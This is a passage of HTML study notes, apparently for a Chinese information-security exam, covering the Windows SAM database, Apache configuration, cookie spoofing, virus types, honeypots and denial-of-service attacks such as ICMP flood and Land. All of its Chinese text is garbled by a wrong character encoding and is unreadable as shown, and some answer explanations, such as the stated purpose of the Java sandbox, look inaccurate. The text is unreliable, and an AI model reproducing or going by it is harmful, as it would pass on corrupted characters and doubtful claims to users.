<li>ç½‘ç»œç‰©ç†éš”ç¦»æ˜¯æŒ‡<strong>ä¸¤ä¸ªç½‘ç»œé—´é“¾è·¯å±‚ã€ç½‘ç»œå±‚åœ¨ä»»ä½•æ—¶åˆ»éƒ½ä¸èƒ½ç›´æ¥é€šè®¯</strong></li>
</ol>
<h2 id="ç¬¬ä¸‰ä»½"><a href="#ç¬¬ä¸‰ä»½" class="headerlink" title="ç¬¬ä¸‰ä»½"></a>ç¬¬ä¸‰ä»½</h2><ol>
<li>Windowsä¸­çš„- <strong>SAMï¼ˆSecurity Accounts Managerï¼‰</strong> æ˜¯ <strong>Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ•°æ®åº“</strong>ï¼Œä¸»è¦ç”¨äºå­˜å‚¨æœ¬åœ°ç”¨æˆ·è´¦æˆ·ä¿¡æ¯å’Œå®‰å…¨æè¿°ç¬¦ã€‚å®ƒåŒ…å«äº† <strong>ç”¨æˆ·åã€å¯†ç å“ˆå¸Œï¼ˆNTLM Hashï¼‰ã€ç»„æˆå‘˜ä¿¡æ¯</strong> ç­‰æ•æ„Ÿæ•°æ®ã€‚ å­˜æ”¾ä½ç½®<code>C:\Windows\System32\config\SAM</code><ul>
<li>A:Â <code>%SystemRoot%\system32\config\sam</code>Â æ˜¯SAMæ•°æ®åº“çš„ç‰©ç†æ–‡ä»¶è·¯å¾„ã€‚</li>
<li>B: SAMæ–‡ä»¶æœ¬èº«å°±æ˜¯ä¸€ä¸ªæ³¨å†Œè¡¨é…ç½®å•å…ƒï¼ˆHiveï¼‰ï¼Œå®ƒåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è¢«åŠ è½½åˆ°æ³¨å†Œè¡¨çš„Â HKEY_LOCAL_MACHINE\SAMÂ é”®ä¸‹ã€‚</li>
<li>D: è¿™å‡†ç¡®åœ°æè¿°äº†SAMçš„åŠŸèƒ½å’Œè®¿é—®æœºåˆ¶ã€‚</li>
<li><strong>C æ˜¯é”™è¯¯çš„</strong>ã€‚SAMæ–‡ä»¶å—åˆ°äº†æå…¶ä¸¥æ ¼çš„ä¿æŠ¤ã€‚åœ¨Windowsç³»ç»Ÿæ­£å¸¸è¿è¡Œæ—¶ï¼Œè¯¥æ–‡ä»¶è¢«<strong>LSASS (Local Security Authority Subsystem Service)</strong>Â è¿›ç¨‹ç‹¬å é”å®šã€‚<strong>ä»»ä½•ç”¨æˆ·ï¼ŒåŒ…æ‹¬Administrator</strong>ï¼Œéƒ½æ— æ³•ç›´æ¥è¯»å–æˆ–å†™å…¥è¿™ä¸ªæ–‡ä»¶ã€‚åªæœ‰æ‹¥æœ‰Â SYSTEMÂ æƒé™çš„LSASSè¿›ç¨‹æ‰èƒ½å¯¹å…¶è¿›è¡Œæ“ä½œã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆé»‘å®¢éœ€è¦ä½¿ç”¨mimikatzç­‰å·¥å…·ä»LSASSè¿›ç¨‹çš„å†…å­˜ä¸­è½¬å‚¨å¯†ç å“ˆå¸Œï¼Œè€Œä¸æ˜¯ç›´æ¥å»è¯»å–SAMæ–‡ä»¶ã€‚</li>
</ul>
</li>
<li>å®Œæ•´æ€§æ£€æŸ¥å’Œæ§åˆ¶æ˜¯ä¸ºäº†é˜²æ­¢<strong>ä¸åˆè¯­ä¹‰çš„æ•°æ®ã€ä¸æ­£ç¡®çš„æ•°æ®</strong>è¿›å…¥æ•°æ®åº“</li>
<li>å½“ä»Šä»»ä½•ä¸€ä¸ªæ ‡å‡†çš„ã€å®é™…è¿è¡Œçš„Apacheç¯å¢ƒä¸­ï¼Œhttpd.confÂ æ˜¯æœåŠ¡å™¨çš„<strong>ä¸»é…ç½®æ–‡ä»¶</strong>ï¼Œå®ƒåŒ…å«äº†æˆ–å¼•ç”¨äº†æ‰€æœ‰çš„é…ç½®ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬è®¿é—®æ§åˆ¶è§„åˆ™ã€‚<br>åœ¨ Apache æ—©æœŸç‰ˆæœ¬ä¸­ï¼Œé…ç½®è¢«æ¸…æ™°åœ°åˆ†æˆäº†ä¸‰ä¸ªæ–‡ä»¶ï¼š<ul>
<li>httpd.conf: åŒ…å«æ ¸å¿ƒçš„æœåŠ¡å™¨æŒ‡ä»¤ã€‚</li>
<li>srm.confÂ (Server Resource Map): åŒ…å«èµ„æºç›¸å…³çš„é…ç½®ï¼Œå¦‚Â DocumentRootã€‚ </li>
<li>access.conf:Â <strong>ä¸“é—¨ç”¨äºå­˜æ”¾è®¿é—®æ§åˆ¶è§„åˆ™</strong>ï¼Œä¾‹å¦‚Â <code>&lt;Directory&gt;Â å’ŒÂ &lt;Location&gt;</code>Â å—ä¸­çš„Â Allow,Â DenyÂ ç­‰æŒ‡ä»¤ã€‚</li>
<li>inetd.confÂ æ˜¯ Linux&#x2F;Unix ç³»ç»Ÿä¸­Â inetdÂ è¶…çº§å®ˆæŠ¤è¿›ç¨‹çš„é…ç½®æ–‡ä»¶ï¼Œä¸ Apache æ— å…³ã€‚</li>
</ul>
</li>
<li>ä¸æ•°æ®åº“çš„å®‰å…¨æœ‰ç›´æ¥å…³ç³»çš„æ˜¯<strong>è®¿é—®æ§åˆ¶çš„ç²’åº¦</strong><ul>
<li><strong>è®¿é—®æ§åˆ¶çš„ç²’åº¦ (Granularity)</strong>Â æŒ‡çš„æ˜¯æƒé™æ§åˆ¶å¯ä»¥ç²¾ç¡®åˆ°ä»€ä¹ˆç¨‹åº¦ã€‚ä¾‹å¦‚ï¼Œæ˜¯åªèƒ½æ§åˆ¶åˆ°è¡¨çº§åˆ«ï¼Œè¿˜æ˜¯å¯ä»¥æ§åˆ¶åˆ°åˆ—çº§åˆ«ï¼Œç”šè‡³æ˜¯è¡Œçº§åˆ«ï¼ˆè¡Œçº§å®‰å…¨ï¼‰ã€‚ç²’åº¦è¶Šç»†ï¼Œå®‰å…¨ç­–ç•¥å°±èƒ½åˆ¶å®šå¾—è¶Šç²¾ç¡®ï¼Œèƒ½æ›´å¥½åœ°éµå¾ª<strong>æœ€å°æƒé™åŸåˆ™</strong>ã€‚è¿™ç›´æ¥å…³ç³»åˆ°æ•°æ®åº“çš„å®‰å…¨æ€§ã€‚</li>
</ul>
</li>
<li><strong>å®¡è®¡ç³»ç»Ÿä¸€èˆ¬åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼šæ—¥å¿—è®°å½•ã€æ—¥å¿—åˆ†æå’Œæ—¥å¿—æŠ¥å‘Š</strong></li>
<li>åœ¨Unixç³»ç»Ÿä¸­ï¼Œ&#x2F;etc&#x2F;serviceæ–‡ä»¶<strong>è®°å½•ä¸€äº›å¸¸ç”¨çš„æ¥å£åŠå…¶æ‰€æä¾›çš„æœåŠ¡çš„å¯¹åº”å…³ç³»</strong><ul>
<li>&#x2F;etc&#x2F;inetd.confï¼š å†³å®šinetdå¯åŠ¨ç½‘ç»œæœåŠ¡æ—¶ï¼Œå¯åŠ¨é‚£äº›æœåŠ¡</li>
<li>&#x2F;etc&#x2F;inittabï¼šå®šä¹‰äº†ç³»ç»Ÿç¼ºçœè¿è¡Œçº§åˆ«ï¼Œç³»ç»Ÿè¿›å…¥æ–°è¿è¡Œçº§åˆ«éœ€è¦åšä»€ä¹ˆ</li>
<li>&#x2F;etc&#x2F;init.d&#x2F;æˆ–Â &#x2F;etc&#x2F;rc.d&#x2F;ï¼š åŒ…å«äº†ç³»ç»Ÿçš„ä¸€äº›å¯åŠ¨è„šæœ¬</li>
</ul>
</li>
<li><strong>windowsç³»ç»Ÿæ˜¯é‡‡ç”¨SID(å®‰å…¨æ ‡è¯†ç¬¦)æ¥æ ‡è¯†ç”¨æˆ·å¯¹æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æƒé™</strong><ul>
<li>åœ¨ Windows NT å†…æ ¸ä¸­ï¼Œæ¯ä¸ªç”¨æˆ·ã€ç»„æˆ–è®¡ç®—æœºéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„<strong>å®‰å…¨æ ‡è¯†ç¬¦ (SID)</strong>ã€‚ç³»ç»Ÿå†…éƒ¨çš„æ‰€æœ‰è®¿é—®æ§åˆ¶ï¼ˆå¦‚æ–‡ä»¶ç³»ç»Ÿçš„ACLï¼‰éƒ½æ˜¯åŸºäº SID æ¥åˆ¤æ–­çš„ï¼Œè€Œä¸æ˜¯åŸºäºå¯å˜çš„ç”¨æˆ·åã€‚</li>
<li>ç”¨æˆ·ååªæ˜¯SIDçš„ä¸€ä¸ªæ–¹ä¾¿äººä»¬è®°å¿†çš„ä¸€ä¸ªåˆ«å</li>
<li>winddowsé»˜è®¤è´¦æˆ·æ˜¯Â AdministratorÂ å’ŒÂ Guestã€‚å®ƒä»¬éƒ½<strong>å¯ä»¥è¢«é‡å‘½å</strong>ï¼Œä½†<strong>ä¸èƒ½è¢«åˆ é™¤</strong></li>
</ul>
</li>
<li>æ•°æ®åº“ç®¡ç†å‘˜åº”å‘DBMSæå‡ºä¸€ç»„å®Œæ•´æ€§è§„åˆ™æ¥æ£€æŸ¥æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œæ•°æ®åº“çš„å®Œæ•´æ€§æ§åˆ¶æœºåˆ¶é€šå¸¸åŒ…æ‹¬<ol>
<li><strong>å®Œæ•´æ€§çº¦æŸæ¡ä»¶ (Constraint):</strong>Â å®šä¹‰ä»€ä¹ˆæ˜¯â€œåˆæ³•â€çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼ŒPRIMARY KEY,Â FOREIGN KEY,Â CHECKã€‚</li>
<li><strong>å®Œæ•´æ€§æ£€æŸ¥æœºåˆ¶ (Check):</strong>Â åœ¨æ‰§è¡ŒÂ INSERT,Â UPDATE,Â DELETEÂ ç­‰æ“ä½œæ—¶ï¼ŒDBMS ä¼šè‡ªåŠ¨è§¦å‘æ£€æŸ¥æœºåˆ¶ï¼Œåˆ¤æ–­è¯¥æ“ä½œæ˜¯å¦ä¼šè¿åçº¦æŸæ¡ä»¶ã€‚</li>
<li><strong>è¿çº¦å¤„ç†æœºåˆ¶ (Action):</strong>Â å¦‚æœæ£€æŸ¥å‘ç°æ“ä½œè¿åäº†çº¦æŸï¼ŒDBMS ä¼šæ‰§è¡Œé¢„å®šä¹‰çš„å¤„ç†åŠ¨ä½œï¼Œæœ€å¸¸è§çš„åŠ¨ä½œå°±æ˜¯<strong>æ‹’ç» (REJECT)</strong>Â è¯¥æ“ä½œå¹¶æŠ¥é”™ã€‚å…¶ä»–åŠ¨ä½œè¿˜åŒ…æ‹¬çº§è”åˆ é™¤ï¼ˆCASCADEï¼‰ç­‰ã€‚</li>
</ol>
<ul>
<li><strong>å®Œæ•´æ€§ä¿®å¤æœºåˆ¶</strong>ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ç»„æˆéƒ¨åˆ†ã€‚DBMS çš„èŒè´£æ˜¯<strong>é˜²æ­¢</strong>åæ•°æ®è¿›å…¥ï¼Œè€Œä¸æ˜¯è‡ªåŠ¨å»<strong>ä¿®å¤</strong>å·²ç»å­˜åœ¨çš„åæ•°æ®ã€‚æ•°æ®ä¿®å¤é€šå¸¸éœ€è¦ DBA æ‰‹åŠ¨è¿›è¡Œã€‚</li>
</ul>
</li>
<li>æ•°æ®åº“äº‹åŠ¡æ—¥å¿—çš„ç”¨é€”æ˜¯<strong>æ•°æ®æ¢å¤</strong></li>
<li><strong>Cookieæ¬ºéª—</strong>æŒ‡çš„æ˜¯æ”»å‡»è€…é€šè¿‡æŸç§æ–¹å¼ï¼ˆå¦‚XSSã€ç½‘ç»œå—…æ¢ï¼‰<strong>çªƒå–</strong>äº†åˆæ³•ç”¨æˆ·çš„Cookieï¼Œç„¶åä½¿ç”¨è¿™ä¸ªCookieæ¥å†’å……è¯¥ç”¨æˆ·ï¼Œä»è€Œç»•è¿‡èº«ä»½éªŒè¯<br>è€Œä¸æ˜¯é€šè¿‡cookieæäº¤ç²¾å¦™æ„é€ çš„ç§»åŠ¨ä»£ç ï¼Œç»•è¿‡èº«ä»½éªŒè¯çš„æ”»å‡»å«åšcookieæ¬ºéª—<ul>
<li><strong>æœ€æ™®éã€æœ€æ ‡å‡†çš„å°†ä¼šè¯IDï¼ˆSession IDï¼‰ä¼ é€’ç»™æµè§ˆå™¨çš„æ–¹å¼ï¼Œå°±æ˜¯é€šè¿‡è®¾ç½®ä¸€ä¸ªCookieï¼</strong>Â æµè§ˆå™¨æ”¶åˆ°çš„Â Set-CookieÂ å¤´é‡Œä¼šåŒ…å«ç±»ä¼¼Â PHPSESSID&#x3D;a1b2c3d4e5f6â€¦Â è¿™æ ·çš„å†…å®¹ã€‚</li>
<li>å› æ­¤ï¼Œâ€œSessionéªŒè¯â€<strong>å¹¶æ²¡æœ‰å–ä»£</strong>â€œCookieéªŒè¯â€ï¼Œ<strong>å®ƒä¾èµ–äºCookie</strong>æ¥ä¼ é€’èº«ä»½å‡­è¯ï¼ˆSession IDï¼‰ã€‚</li>
</ul>
</li>
<li>Javaå®‰å…¨æ¨¡å‹(JSM)æ˜¯åœ¨è®¾è®¡è™šæ‹Ÿæœº(JVN)æ—¶ï¼Œå¼•å…¥æ²™ç®±(sandbox)æœºåˆ¶ï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯<strong>ä¸ºæœåŠ¡å™¨æä¾›é’ˆå¯¹æ¶æ„å®¢æˆ·ç«¯ä»£ç çš„ä¿æŠ¤</strong><ul>
<li>æ²™ç®±ä¸ºæ¥è‡ªç½‘ç»œçš„ã€ä¸å¯ä¿¡çš„ä»£ç æä¾›ä¸€ä¸ª<strong>å—é™åˆ¶çš„è¿è¡Œç¯å¢ƒ</strong>ï¼Œä¸¥æ ¼é™åˆ¶å®ƒè®¿é—®æœ¬åœ°ç³»ç»Ÿèµ„æºçš„èƒ½åŠ›ï¼ˆå¦‚è¯»å†™æ–‡ä»¶ã€æ‰“å¼€ç½‘ç»œè¿æ¥ç­‰ï¼‰ã€‚</li>
</ul>
</li>
<li>åœ¨å…¸å‹çš„webåº”ç”¨ç«™ç‚¹çš„å±‚æ¬¡ç»“æ„ä¸­ï¼Œâ€œä¸­é—´ä»¶â€æ˜¯åœ¨å“ªé‡Œè¿è¡Œçš„ â€“ <strong>åº”ç”¨æœåŠ¡å™¨</strong><br>åœ¨ç»å…¸çš„ä¸‰å±‚&#x2F;Nå±‚æ¶æ„ä¸­ï¼š<ul>
<li><strong>WebæœåŠ¡å™¨ (å¦‚ Apache, Nginx):</strong>Â è´Ÿè´£å¤„ç†é™æ€å†…å®¹å’Œæ¥å—HTTPè¯·æ±‚ï¼Œç„¶åå°†åŠ¨æ€è¯·æ±‚è½¬å‘ç»™åº”ç”¨æœåŠ¡å™¨ã€‚</li>
<li><strong>åº”ç”¨æœåŠ¡å™¨ (Application Server):</strong>Â è¿™æ˜¯è¿è¡Œ<strong>ä¸šåŠ¡é€»è¾‘</strong>çš„åœ°æ–¹ã€‚<strong>ä¸­é—´ä»¶</strong>ï¼ˆå¦‚ Tomcat, JBoss, WebLogic, ASP.NET Coreè¿è¡Œæ—¶ï¼‰å°±æ˜¯åº”ç”¨æœåŠ¡å™¨çš„æ ¸å¿ƒï¼Œå®ƒè´Ÿè´£è§£é‡Šå’Œæ‰§è¡Œåç«¯ä»£ç ï¼ˆJava, C#, PHPç­‰ï¼‰ï¼Œå¤„ç†ä¸šåŠ¡æµç¨‹ï¼Œå¹¶ä¸æ•°æ®åº“äº¤äº’ã€‚</li>
<li><strong>æ•°æ®åº“æœåŠ¡å™¨ (å¦‚ MySQL, Oracle):</strong>Â è´Ÿè´£æ•°æ®çš„å­˜å‚¨å’Œæ£€ç´¢ã€‚</li>
</ul>
</li>
<li>ç—…æ¯’çš„ç‰¹æ€§ï¼šÂ <strong>å¯æ„ŸæŸ“ã€ä¾é™„æ€§</strong><ul>
<li>ä¸ä¹‹ç›¸å¯¹çš„æ˜¯<strong>è •è™« (Worm)</strong>ï¼Œè •è™«æ˜¯<strong>ç‹¬ç«‹</strong>çš„ç¨‹åºï¼Œå®ƒé€šè¿‡ç½‘ç»œè‡ªä¸»ä¼ æ’­ï¼Œä¸éœ€è¦ä¾é™„äºå®¿ä¸»æ–‡ä»¶ã€‚</li>
</ul>
</li>
<li>æ€æ¯’è½¯ä»¶æŠ¥å‘Šå‘ç°ç—…æ¯’Macro.Melissa,ç”±è¯¥ç—…æ¯’åç§°å¯ä»¥æ¨æ–­å‡ºç—…æ¯’ç±»å‹æ˜¯<strong>å®ç—…æ¯’</strong><ul>
<li>ç—…æ¯’è½¯ä»¶å‚å•†çš„ç—…æ¯’å‘½åé€šå¸¸éµå¾ªä¸€å®šæ ¼å¼ï¼šç—…æ¯’ç±»å‹.ç—…æ¯’å®¶æ—å.å˜ç§ã€‚</li>
</ul>
</li>
<li>ä¿¡æ¯å®‰å…¨æ•°æ®çš„è½½ä½“æœ‰<ul>
<li><strong>ç½‘ç»œåè®® (å¦‚IPsec, TLS):</strong>Â æä¾›äº†ä¼ è¾“è¿‡ç¨‹ä¸­çš„åŠ å¯†å’Œè®¤è¯æœºåˆ¶ã€‚</li>
<li><strong>æ“ä½œç³»ç»Ÿ (å¦‚Linux, Windows):</strong>Â æä¾›äº†è®¿é—®æ§åˆ¶ã€èº«ä»½è®¤è¯ã€æ—¥å¿—å®¡è®¡ç­‰åŸºç¡€å®‰å…¨åŠŸèƒ½ã€‚</li>
<li><strong>åº”ç”¨ç³»ç»Ÿ (å¦‚OA, ERP):</strong>Â å®ç°äº†åº”ç”¨å±‚é¢çš„æƒé™æ§åˆ¶å’Œä¸šåŠ¡é€»è¾‘å®‰å…¨ã€‚</li>
</ul>
</li>
<li>æœ‰æ•ˆçš„ç¼“å†²åŒºæº¢å‡ºçš„é˜²æŠ¤æªæ–½ ^id2<ul>
<li>B. ä¸¥æ ¼éªŒè¯è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦</li>
<li>C. è¿‡æ»¤ä¸åˆè§„åˆ™çš„å­—ç¬¦</li>
<li>D. ä½¿ç”¨ç¬¬ä¸‰æ–¹å®‰å…¨çš„å­—ç¬¦ä¸²åº“æ“ä½œ<br><strong>æ ‡å‡†Cè¯­è¨€</strong>ä¸­çš„è®¸å¤šå­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼ˆå¦‚Â strcpy,Â strcat,Â gets,Â sprintfï¼‰æ˜¯<strong>ä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥</strong>çš„ï¼Œå®ƒä»¬æ˜¯å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„<strong>ä¸»è¦å…ƒå‡¶</strong>ã€‚</li>
</ul>
</li>
<li>èœœç½çš„åŠŸèƒ½ï¼š<ul>
<li>å¯ä»¥å¸å¼•æˆ–è½¬ç§»æ”»å‡»è€…çš„æ³¨æ„åŠ›ï¼Œå»¶ç¼“ä»–ä»¬å¯¹çœŸæ­£ç›®æ ‡çš„æ”»å‡»</li>
<li>å¸å¼•å…¥ä¾µè€…æ¥å—…æ¢ã€æ”»å‡»ï¼ŒåŒæ—¶ä¸è¢«è§‰å¯Ÿåœ°å°†å…¥ä¾µè€…çš„æ´»åŠ¨è®°å½•ä¸‹æ¥</li>
<li>å¯ä»¥å¯¹æ”»å‡»æ´»åŠ¨è¿›è¡Œç›‘è§†ã€æ£€æµ‹å’Œåˆ†æ</li>
<li>èœœç½‘çš„ä¸‰å¤§å…³é”®æŠ€æœ¯æ˜¯<strong>æ•°æ®æ•è·ã€æ•°æ®æ§åˆ¶å’Œæ•°æ®åˆ†æ</strong><br>â€œæ”»å‡»æ£€æµ‹å’Œå®æ—¶æŠ¥è­¦â€æ˜¯å…¸å‹çš„<strong>å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ (IDS)</strong>Â æˆ–<strong>å…¥ä¾µé˜²å¾¡ç³»ç»Ÿ (IPS)</strong>Â çš„åŠŸèƒ½ã€‚ä¸æ˜¯èœœç½çš„åŠŸèƒ½</li>
</ul>
</li>
<li>ä¸‹åˆ—å…³äºè®¡ç®—æœºç—…æ¯’æ„ŸæŸ“èƒ½åŠ›çš„è¯´æ³•ä¸æ­£ç¡®çš„æ˜¯ â€“ <strong>èƒ½å°†è‡ªèº«ä»£ç æ³¨å…¥æ–‡æœ¬æ–‡ä»¶ä¸­å¹¶æ‰§è¡Œ</strong><ul>
<li>B èƒ½å°†è‡ªèº«ä»£ç æ³¨å…¥åˆ°æ–‡æ¡£æˆ–æ¨¡æ¿çš„å®ä¸­ä»£ç :Â <strong>å®ç—…æ¯’</strong>å°±æ˜¯æ„ŸæŸ“Officeæ–‡æ¡£çš„å®ä»£ç ã€‚æ­£ç¡®ã€‚</li>
<li>C èƒ½å°†è‡ªèº«ä»£ç æ³¨å…¥åˆ°å¼•å¯¼åŒº:Â <strong>å¼•å¯¼åŒºç—…æ¯’</strong>å°±æ˜¯æ„ŸæŸ“ç¡¬ç›˜çš„ä¸»å¼•å¯¼è®°å½•(MBR)æˆ–åˆ†åŒºå¼•å¯¼è®°å½•(DBR)ã€‚æ­£ç¡®ã€‚</li>
<li>D èƒ½å°†è‡ªèº«ä»£ç æ³¨å…¥åˆ°æ‰‡åŒºä¸­çš„æ–‡ä»¶é•œåƒ:Â <strong>æ–‡ä»¶å‹ç—…æ¯’</strong>å°±æ˜¯æ„ŸæŸ“å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¦‚.exe,Â .comï¼‰ã€‚è¿™ä¸ªæè¿°è™½ç„¶ä¸ç²¾ç¡®ï¼Œä½†æ„æŒ‡æ„ŸæŸ“æ–‡ä»¶ã€‚æ­£ç¡®ã€‚</li>
</ul>
</li>
<li><strong>ä»£ç æ³¨å…¥</strong>ï¼š ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¢«ä¸€ä¸ªè§£é‡Šå™¨å½“ä½œå‘½ä»¤æˆ–æŸ¥è¯¢è¯­å¥çš„ä¸€éƒ¨åˆ†æ‰§è¡Œ</li>
<li>æŸæœåŠ¡å™¨æ„ŸæŸ“äº†ä¸€ä¸ªæœ¨é©¬ï¼Œå®‰å…¨ç®¡ç†å‘˜é€šè¿‡è¿›ç¨‹åˆ†ææ‰¾åˆ°æœ¨é©¬è¿›ç¨‹ä¸ºs.exe,ä½ç½®æ˜¯c:\s.exeæ–‡ä»¶ï¼Œä½†å½“å®‰å…¨ç®¡ç†å‘˜ç»ˆæ­¢è¯¥è¿›ç¨‹åï¼Œåˆ°cç›˜æŸ¥æ‰¾è¯¥æ–‡ä»¶å´çœ‹ä¸åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œå®‰å…¨ç®¡ç†å‘˜ç»™å‡ºäº†å››ç§æœ¨é©¬ç—…æ¯’éšè—è‡ªèº«çš„æ–¹å¼åˆ†æï¼Œå…¶ä¸­å“ªä¸€ç§åˆ†ææ–¹å¼æ˜¯<strong>é”™è¯¯</strong>çš„? â€“ <strong>D æœ¨é©¬é€šè¿‡è®¾ç½®è‡ªèº«å±æ€§ä¸ºç³»ç»Ÿã€éšè—æ–‡ä»¶ï¼Œä»è€Œå®ç°åœ¨ç³»ç»Ÿä¸­éšè—</strong><ul>
<li>A æœ¨é©¬é‡‡ç”¨DLLæ³¨å…¥æ–¹å¼ä¼ªé€ è¿›ç¨‹åç§°ï¼Œåœ¨è¿›ç¨‹åˆ†æä¸­çœ‹èµ·æ¥æ˜¯åœ¨Cç›˜æ ¹ç›®å½•ä¸‹ï¼Œå®é™…ä¸åœ¨æ­¤ç›®å½•</li>
<li>C s.exeæ˜¯æœ¨é©¬åœ¨è¿è¡Œèµ·æ¥åç”Ÿæˆçš„ï¼Œæ¯æ¬¡é€€å‡ºåä¼šå°†è‡ªèº«åˆ é™¤ï¼Œæ‰€ä»¥åœ¨Cç›˜æ— æ³•æŸ¥è¯¢æ­¤ç—…æ¯’</li>
<li>D å¦‚æœæœ¨é©¬åªæ˜¯ç”¨äº†è¿™ç§åˆçº§æ–¹æ³•ï¼Œ<strong>å®‰å…¨ç®¡ç†å‘˜æ˜¯ä¸€å®šèƒ½å¤Ÿçœ‹åˆ°è¿™ä¸ªæ–‡ä»¶çš„</strong>ã€‚</li>
<li>B æœ¨é©¬åˆ©ç”¨hookæŠ€æœ¯è·å–ç”¨æˆ·æŸ¥è¯¢æ‰åšçš„æ¶ˆæ¯ï¼Œç„¶åå°†è‡ªèº«ä»å†…å­˜ä¸­çš„æ–‡ä»¶ç»“æ„ä¸­åˆ é™¤ï¼Œä½¿è‡ªå·±å®é™…åœ¨Cç›˜ï¼Œä½†æ˜¯åœ¨æŸ¥è¯¢æ—¶æ— æ³•çœ‹åˆ°</li>
</ul>
</li>
<li>é€šè¿‡å‘è¢«æ”»å‡»è€…å‘é€å¤§é‡çš„ICMPå›åº”è¯·æ±‚ï¼Œæ¶ˆè€—è¢«æ”»å‡»è€…çš„èµ„æºæ¥è¿›è¡Œå“åº”ï¼Œç›´è‡³è¢«æ”»å‡»è€…å†ä¹Ÿæ— æ³•å¤„ç†æœ‰æ•ˆçš„ç½‘ç»œä¿¡æ¯æµæ—¶ï¼Œè¿™ç§æ”»å‡»ç§°ä¹‹ä¸º<strong>ICMP Flood</strong><ul>
<li>Smurfæ”»å‡»æ˜¯ä¸€ç§<strong>æ”¾å¤§å‹</strong>çš„ICMPæ´ªæ°´æ”»å‡»ï¼Œå®ƒå‘ç½‘ç»œçš„å¹¿æ’­åœ°å€å‘é€ä¼ªé€ æºIPçš„pingè¯·æ±‚ï¼Œå¯¼è‡´ç½‘ç»œä¸­å¤§é‡ä¸»æœºåŒæ—¶å‘å—å®³è€…å›åº”ã€‚</li>
<li>Ping of DeathÂ æ˜¯å‘é€ä¸€ä¸ªè¶…å¤§çš„ã€ç•¸å½¢çš„ICMPåŒ…æ¥ä½¿æ—§ç³»ç»Ÿå´©æºƒã€‚</li>
<li>Landæ”»å‡»æ˜¯TCP SYNæ”»å‡»ã€‚ æ”»å‡»è€…ä½¿ç”¨ä¼ªé€ çš„SYNåŒ…ï¼ŒåŒ…çš„æºåœ°å€å’Œç›®æ ‡åœ°å€éƒ½è¢«è®¾ç½®æˆè¢«æ”»å‡»æ–¹çš„åœ°å€ï¼Œè¿™æ ·è¢«æ”»å‡»æ–¹ä¼šç»™è‡ªå·±å‘é€SYN-ACKæ¶ˆæ¯å¹¶å‘å›ACKæ¶ˆæ¯ï¼Œåˆ›å»ºä¸€ä¸ªç©ºè¿æ¥ï¼Œæ¯ä¸€ä¸ªè¿™æ ·çš„è¿æ¥éƒ½å°†ä¿æŒåˆ°è¶…æ—¶ä¸ºæ­¢ï¼Œè¿™æ ·è¿‡å¤šçš„ç©ºè¿æ¥ä¼šè€—å°½è¢«æ”»å‡»æ–¹çš„èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚</li>
</ul>
</li>
<li>å®‰å…¨å®¡è®¡çš„ä½œç”¨ï¼š<ul>
<li>è¾…åŠ©è¾¨è¯†å’Œåˆ†ææœªç»æˆæƒçš„æ´»åŠ¨æˆ–æ”»å‡»</li>
<li>å¯¹ä¸å·²å»ºç«‹çš„å®‰å…¨ç­–ç•¥çš„ä¸€è‡´æ€§è¿›è¡Œæ ¸æŸ¥</li>
<li>å‘ç°éœ€è¦æ”¹è¿›çš„å®‰å…¨æ§åˆ¶æªæ–½</li>
</ul>
</li>
<li>HTTPå·¥ä½œçš„æ¶æ„æ¨¡å¼æ˜¯<strong>å®¢æˆ·ç«¯-æœåŠ¡ç«¯æ¨¡å¼</strong></li>
<li>HTTPå“åº”å¤´ä¿¡æ¯ä¸­ï¼Œallowå…è®¸å“ªç§è¯·æ±‚æ–¹å¼ â€“ <strong>GET POST OPTIONS</strong><ul>
<li>AllowÂ æ˜¯ä¸€ä¸ª<strong>å“åº”å¤´ (Response Header)</strong>ï¼Œå®ƒç”¨äº<strong>å“åº”</strong>ä¸€ä¸ªÂ OPTIONSÂ è¯·æ±‚ã€‚</li>
<li><strong>OPTIONS</strong>Â æ˜¯ä¸€ä¸ª<strong>è¯·æ±‚æ–¹æ³• (Request Method)</strong>ï¼Œå®¢æˆ·ç«¯ä½¿ç”¨Â OPTIONSÂ æ–¹æ³•æ¥è¯¢é—®æœåŠ¡å™¨ï¼ŒæŸä¸ªURLèµ„æºæ”¯æŒå“ªäº›HTTPè¯·æ±‚æ–¹æ³•ï¼ˆå¦‚GET, POST, PUT, DELETEç­‰ï¼‰ã€‚</li>
<li>æœåŠ¡å™¨æ”¶åˆ°Â OPTIONSÂ è¯·æ±‚åï¼Œä¼šåœ¨å“åº”å¤´ä¸­åŠ å…¥Â Allow: GET, POST, HEADÂ è¿™æ ·çš„å­—æ®µæ¥å›ç­”ã€‚å› æ­¤ï¼ŒAllowÂ å¤´ä¸Â OPTIONSÂ æ–¹æ³•æ˜¯ç›´æ¥å¯¹åº”çš„ã€‚</li>
</ul>
</li>
<li>OSIä¸ƒå±‚ç½‘ç»œæ¨¡å‹ 1-7ï¼š<strong>ç‰©ç†å±‚ æ•°æ®é“¾è·¯å±‚ ç½‘ç»œå±‚ ä¼ è¾“å±‚ ä¼šè¯å±‚ è¡¨ç¤ºå±‚ åº”ç”¨å±‚</strong></li>
<li>è®¡ç®—æœºå–è¯çš„åˆæ³•åŸåˆ™æ˜¯<strong>è®¡ç®—æœºå–è¯åœ¨ä»»ä½•æ—¶å€™éƒ½å¿…é¡»ä¿è¯ç¬¦åˆç›¸å…³æ³•å¾‹æ³•è§„</strong></li>
</ol>
<h2 id="ç¬¬å››ä»½"><a href="#ç¬¬å››ä»½" class="headerlink" title="ç¬¬å››ä»½"></a>ç¬¬å››ä»½</h2><ol>
